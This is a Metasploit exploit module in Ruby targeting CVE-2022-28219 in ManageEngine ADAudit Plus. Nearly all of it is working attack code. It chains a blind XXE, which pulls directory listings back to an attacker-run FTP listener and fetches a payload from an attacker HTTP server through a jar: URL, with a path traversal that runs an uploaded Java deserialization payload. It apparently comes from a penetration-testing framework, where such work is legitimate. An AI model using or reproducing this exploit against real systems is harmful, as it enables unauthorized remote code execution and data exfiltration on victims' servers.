##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::CmdStager
  include Msf::Exploit::JavaDeserialization
  # include Msf::Exploit::Remote::Java::HTTP::ClassLoader
  # include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ManageEngine ADAudit Plus CVE-2022-28219',
        'Description' => %q{
          This module exploits CVE-2022-28219, which is a pair of
          vulnerabilities: a path traversal in the /cewolf endpoint, and a
          blind XXE in, to upload and execute an executable file.
        },
        'Author' => [
          'Ron Bowes', # Analysis and module
          'Naveen Sunkavally', # Initial PoC + disclosure
        ],
        'References' => [
          ['CVE', '2022-28219'],
          ['URL', 'https://www.horizon3.ai/red-team-blog-cve-2022-28219/'],
          ['URL', 'https://attackerkb.com/topics/Zx3qJlmRGY/cve-2022-28219/rapid7-analysis'],
          ['URL', 'https://www.manageengine.com/products/active-directory-audit/cve-2022-28219.html'],
        ],
        'DisclosureDate' => '2022-06-29',
        'License' => MSF_LICENSE,
        'Platform' => 'java',
        'Arch' => ARCH_JAVA,
        'Privileged' => false, # true if ADAudit Plus is run as a service

        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'win',
              'Type' => :win_cmd,
            }
          ],
        ],


        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8081
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION], # TODO: Verify this
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI_DESERIALIZATION', [true, 'Path traversal and unsafe deserialization endpoint', '/cewolf/logo.png']),
      OptString.new('TARGETURI_XXE', [true, 'XXE endpoint', '/api/agent/tabs/agentData']),
      OptString.new('DOMAIN', [true, 'Domain the target monitors', 'ad.example.local']), # TODO: force the user to enter this
      OptString.new('LPORT_FTP', [true, 'Port for FTP reverse connection', 2121]),
      OptString.new('LPORT_HTTP2', [true, 'Port for FTP reverse connection', 8888]),
    ])
  end

  def srv_host()
    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      return datastore['URIHOST'] || Rex::Socket.source_address(rhost)
    else
      return datastore['SRVHOST']
    end
  end

  def check
    # Make sure it's ADAudit Plus by requesting the root and checking the title
    res1 = send_request_cgi(
      'method' => 'GET',
      'uri' => '/',
    )

    unless res1
      return CheckCode::Unknown('Target failed to respond to check.')
    end

    unless res1.code == 200 && res1.body.match?(%r{<title>ADAudit Plus})
      return CheckCode::Safe('Does not appear to be ADAudit Plus')
    end

    # Check if it's a vulnerable version (the patch removes the /cewolf endpoint
    # entirely)
    res2 = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri("#{ datastore['TARGETURI_DESERIALIZATION'] }?img=abc"),
    )

    unless res2
      return CheckCode::Unknown('Target failed to respond to check.')
    end

    unless res2.code == 200
      return CheckCode::Safe('Target does not have vulnerable endpoint (likely patched).')
    end

    CheckCode::Vulnerable('The vulnerable endpoint responds with HTTP/200.')
  end

  def exploit
    # List the /users folder - this is good to do first, since we can fail early
    # if something isn't working
    print_status("Getting directory listing for /users...")
    users = get_directory_listing('/users')
    unless users
      fail_with(Failure::NotVulnerable, 'Failed to get a list of users')
    end

    # Remove common users
    users -= ['Default', 'Default User', 'All Users', 'desktop.ini', 'Public']
    unless users.length > 0
      fail_with(Failure::NotFound, 'Failed to find any non-default user accounts')
    end
    print_status("User accounts discovered: #{ users.join(', ') }")

    # Check the filesystem for existing payloads that we should ignore
    print_status("Checking for old payloads so we can skip them later")
    existing_payloads = search_for_payloads(users)
    unless existing_payloads
      fail_with(Failure::Unknown, "Couldn't enumerate user directories")
    end

    # Create a serialized payload
    begin
      # Upload payload to remote server
      # (this spawns a thread we need to clean up)
      t = upload_payload(generate_java_deserialization_for_payload('CommonsBeanutils1', payload))

      # Wait for that to happen
      Rex.sleep(3)

      # Get a list of possible payloads
      possible_payloads = search_for_payloads(users)
      unless possible_payloads
        fail_with(Failure::Unknown, "Couldn't search user directories for payloads")
      end

      # Remove stuff that was already there
      possible_payloads -= existing_payloads

      # Make sure the payload exists
      unless possible_payloads.length > 0
        fail_with(Failure::Unknown, "Exploit appeared to work, but did not find the payload in a temp directory")
      end

      # If multiple payloads appeared, abort for safety
      if possible_payloads.length > 1
        fail_with(Failure::UnexpectedReply, "Found #{ possible_payloads.length } payloads created in temp folders - there should only be one!")
      end

      # Execute the one payload
      execute_payload(possible_payloads.pop())
    ensure
      # Kill the upload thread
      if t
        begin
          t.kill
        rescue
          # Do nothing if we fail to kill the thread
        end
      end
    end
  end

  def get_directory_listing(folder)
    # Generate a unique callback URL
    path = "/#{ rand_text_alpha(8+rand(8)) }.dtd"
    full_url = "http://#{ srv_host() }:#{ datastore['SRVPORT'] }#{ path }"

    # Start a HTTP server that will cause the FTP connection
    serve_http_file(path, "<!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://#{ srv_host() }:#{ datastore['LPORT_FTP'] }/%file;'>\"> %all;")

    # Start a server to handle the reverse FTP connection
    ftp_server = Rex::Socket::TcpServer.create(
      'LocalPort' => datastore['LPORT_FTP'],
      'LocalHost' => datastore['SRVHOST'],
      'Context' => {
        'Msf' => framework,
        'MsfExploit' => self
    })
    print_status("Waiting for FTP connection on #{srv_host()}:#{datastore['LPORT_FTP']}")

    # Trigger the XXE to get file listings
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => "#{ normalize_uri(datastore['TARGETURI_XXE']) }",
      'ctype' => "application/json",
      'data' => encode_payload("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:#{ folder }\"><!ENTITY % dtd SYSTEM \"#{ full_url }\"> %dtd;]><data>&send;</data>"),
    )

    # Accept an FTP session, and wait a short amount of time for data to come in
    ftp_client = nil
    ftp_data = ''
    begin
      # We don't have a good way to tell when the data is fully received, so
      # wait for a short amount of time
      Timeout.timeout(1) do # No
        ftp_client = ftp_server.accept()
        print_status("Received FTP connection! Retrieving directory listing...")

        # Just enough FTP protocol to get what we need
        ftp_client.print("200 hello I'm FTP\n")
        ftp_client.print("331 password please\n")

        # This technically sends too many requests for data, but that doesn't change anything
        loop do
          ftp_client.print("230 send data plz\n")
          ftp_data += ftp_client.recv(256)
        end
      end
    rescue Timeout::Error
      # Do nothing, the FTP session is finished
    ensure
      ftp_server.close()
      if ftp_client
        ftp_client.close()
      end
    end

    # If we actually received data, remove all the junk and split at newlines
    if ftp_data =~ /RETR (.*)/m
      return $1.split(/\n/).map { |d| d.chomp() }
    end

    return nil
  end

  def search_for_payloads(users)
    return users.map do |u|
      dir = "/users/#{ u }/appdata/local/temp"
      print_status("Searching for serialized payloads in #{ dir }...")

      # This will search for the payload, but right now just print stuff
      listing = get_directory_listing(dir)
      if !listing
        print_warning("Couldn't get directory listing for #{ dir }")
        next
      end

      listing
        .select { |f| f =~ /^jar_cache[0-9]+.tmp$/ }
        .map { |f| File.join(dir, f) }
    end.flatten
  end

  def upload_payload(payload)
    print_status("Uploading the payload...")

    t = Thread.new do
      c = nil
      begin
        print_status("Starting a fake HTTP server")
        http_server = Rex::Socket::TcpServer.create(
          'LocalPort' => datastore['LPORT_HTTP2'],
          'LocalHost' => srv_host(),
          'Context' => {
            'Msf' => framework,
            'MsfExploit' => self
        })

        print_status("Listening for HTTP connection on #{srv_host()}:#{datastore['LPORT_HTTP2']}")

        c = http_server.accept()

        print_status("Received file-transfer HTTP connection!")

        # Receive and discard the HTTP request
        c.recv(1024)
        c.print "HTTP/1.1 200 OK\r\n"
        c.print "Connection: keep-alive\r\n"
        c.print "\r\n"
        c.print payload

        print_status("Holding file-transfer connection open...")
        Rex.sleep(5) # TODO: Make this nicer
        print_status("Okay, closing connections now!")
      ensure
        http_server.close()
        if c
          c.close()
        end
      end

    end

    # Send the trigger
    path = "/#{ rand_text_alpha(8+rand(8)) }.jar!/file.txt"
    full_url = "http://#{ srv_host() }:#{ datastore['LPORT_HTTP2'] }#{ path }"
    print_status("Generated URL for file upload: #{ full_url }")

    # Trigger the XXE to get file listings
    print_status("Sending upload_file XXE payload to #{ normalize_uri(datastore['TARGETURI_XXE']) }...")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => "#{ normalize_uri(datastore['TARGETURI_XXE']) }",
      'ctype' => "application/json",
      'data' => encode_payload("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM \"jar:#{ full_url }\"> %xxe;]>"),
    )

    return t
  end

  def execute_payload(path)
    print_status("Attempting to execute payload: #{ path }...")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => "#{ datastore['TARGETURI_DESERIALIZATION'] }?img=/../../../../../../../../../../../../../#{ path }",
    )
  end

  def serve_http_file(path, respond_with = '')
    # do not use SSL for the attacking web server
    if datastore['SSL']
      ssl_restore = true
      datastore['SSL'] = false
    end

    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        send_response(cli, respond_with)
      },
      'Path' => path,
    }})

    datastore['SSL'] = true if ssl_restore
  end

  def encode_payload(xml_payload)
    return [{
      "DomainName" => datastore['domain'],
      "EventCode" => 4688,
      "EventType" => 0,
      "TimeGenerated" => 0,
      "Task Content" => xml_payload,
    }].to_json
  end
end
